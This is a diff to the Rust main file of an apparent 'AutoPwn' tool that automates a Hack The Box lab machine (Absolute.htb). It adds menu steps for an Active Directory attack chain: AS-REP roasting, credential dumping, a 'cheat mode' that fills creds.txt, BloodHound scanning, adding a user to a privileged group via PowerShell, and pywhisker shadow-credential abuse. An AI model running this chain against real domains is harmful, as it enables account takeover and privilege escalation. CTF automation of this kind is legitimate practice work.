@@ -6,6 +6,9 @@ mod step_2;
 mod step_3;
 mod step_4;
 mod step_5;
+mod step_6;
+mod step_8;
+mod step_9;
 
 fn main() {
     // Get the IP address from the user
@@ -56,8 +59,12 @@ fn main() {
         println!("Step 2. Validate + ASREPRoast");
         println!("Step 3. Sync time to Absolute.htb");
         println!("Step 4. Generate TGTs + Dump Users");
-        println!("Step 5. Grab SMB File");
-        println!("6. Quit");
+        println!("Step 5. Grab SMB File (you can skip this...)");
+        println!("Step 6. BloodHound Scan (you can skip this...)");
+        println!("Step 7. Next Steps Information (please read)");
+        println!("Step 8. MUST BE RAN ON WINDOWS!");
+        println!("Step 9. Own WinRM_User!");
+        println!("10. Quit");
 
         print!("Enter your choice: ");
         let _ = stdout().flush();
@@ -105,6 +112,40 @@ fn main() {
 
             }
             "6" => {
+                println!("Cheat mode activated....");
+                // grabed from test.exe but we cheating
+                println!("Adding stuff to creds.txt...");
+                step_6::cheat_mode();
+                println!("Grabbing new TGT...");
+                step_6::run_impacket_gettgt_third_user();
+                println!("Running Bloodhound...");
+                step_6::run_bloodhound_python();
+
+            }
+            "7" => {
+                println!("The next step must be ran on a windows machine. This windows machine must be a windows server or windows 10 Pro/Enterprise (home edition WILL NOT work)");
+                println!("I have provided a Windows Release of this program to run the next step. Once step 8 is done you can continue running this program on linux");
+                println!("Your Windows Machine must have your HTB VPN");
+                println!("Your Windows Machine must also have PowerView in the same directory as this AutoPwn...");
+                println!("Run this Program as Admin on windows...");
+                println!("After Step 8 is done (on windows). Quickly start your VPN back up on your Linux Machine and run Step 9");
+            }
+            "8" => {
+                println!("Updating Host File...");
+                step_8::update_hosts_file();
+                println!("Syncing time with absolute.htb");
+                step_8::sync_windows_time();
+                println!("Setting absolute.htb as Primary DNS...");
+                step_8::set_primary_dns();
+                println!("Adding m.lovegod as Network Audit Member");
+                step_8::run_powershell_commands();
+                println!("Assuming you did not get any errors. Log back on your Linux and continue the steps...")
+            }
+            "9" => {
+                println!("Running pywhisker...");
+                step_9::run_pywhisker();
+            }
+            "10" => {
                 println!("Quitting...");
                 break;
             }
